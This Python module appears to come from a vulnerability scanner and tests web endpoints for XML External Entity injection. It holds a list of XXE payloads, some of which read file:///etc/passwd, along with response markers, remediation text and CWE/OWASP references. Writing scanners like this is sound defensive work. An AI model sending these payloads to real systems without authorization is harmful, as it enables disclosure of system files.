"""SentinelX module [20]: XML External Entity (XXE) injection.

Real implementation: content-type switching (form -> XML), external entity
probes with marker-based detection, error-based detection via parser error
signatures. Safe: entities reference local marker files, no OOB exfiltration.
"""

from __future__ import annotations

import re
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


XXE_PAYLOADS = [
    # classic file disclosure
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
     re.compile(r"root:x:0:0:"), "file:///etc/passwd content reflected"),
    # parameter entity (bypass naive filters)
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "file:///etc/passwd"> %a;]><r>test</r>',
     re.compile(r"root:x:0:0:"), "parameter entity file disclosure"),
    # error-based: invalid entity triggers parser error with system id
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent-sx-12345">]><r>&xxe;</r>',
     re.compile(r"nonexistent-sx-12345|failed to load external entity|parser error", re.I),
     "external entity resolution error"),
    # billion laughs (DoS probe - safe mode: small, just detection)
    ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lollollollollollollollol">]><r>&lol;</r>',
     re.compile(r"lollollol"), "entity expansion reflected"),
]

ERROR_SIGS = [
    (re.compile(r"xml.*parse.*error|parser error|malformed xml", re.I), "XML parser error - XML accepted"),
    (re.compile(r"doctype.*not allowed|dtd.*prohibited|external.*entit", re.I), "DTD/entity handling detected"),
]

REMEDIATION_XXE = (
    "Disable DTDs and external entity resolution in XML parsers. Use "
    "defusedxml (Python), or set parser features to disallow DOCTYPE. "
    "Prefer JSON over XML for new APIs."
)


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent,
               "Content-Type": "application/xml"}

    # signal 1: does the endpoint accept XML? (content-type switching)
    probe_xml = '<?xml version="1.0"?><r><test>sx</test></r>'
    p = dict(params)
    # send as raw XML body regardless of original method params
    resp = await client.post(url, data=probe_xml.encode(), headers=headers)
    xml_accepted = False
    if resp and resp.status_code < 400:
        for rx, _ in ERROR_SIGS:
            if rx.search(resp.text):
                xml_accepted = True
                break
        # also: 200 with no error on well-formed XML suggests acceptance
        if resp.status_code == 200:
            xml_accepted = True

    if not xml_accepted:
        return findings

    # signal 2: XXE payloads with marker/error confirmation (2 signals required)
    for payload, marker_rx, label in XXE_PAYLOADS:
        r2 = await client.post(url, data=payload.encode(), headers=headers)
        if not r2:
            continue
        m = marker_rx.search(r2.text)
        if m:
            # confirm: resend to rule out coincidence
            r3 = await client.post(url, data=payload.encode(), headers=headers)
            if r3 and marker_rx.search(r3.text):
                ev = Evidence(
                    request_raw=raw_request("POST", url, headers, payload.encode()[:500]),
                    response_raw=raw_response(r2.status_code, dict(r2.headers), r2.content),
                    proof=f"XXE confirmed (2/2): {label}; endpoint accepts XML content-type",
                )
                findings.append(Finding(
                    type="XML External Entity", subtype="xxe",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
                    confidence=0.90, url=url, method="POST", param="",
                    payload=payload[:120], evidence=ev, cwe="CWE-611",
                    owasp="A05:2021 – Security Misconfiguration",
                    remediation=REMEDIATION_XXE,
                    references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                ))
                break
    return findings
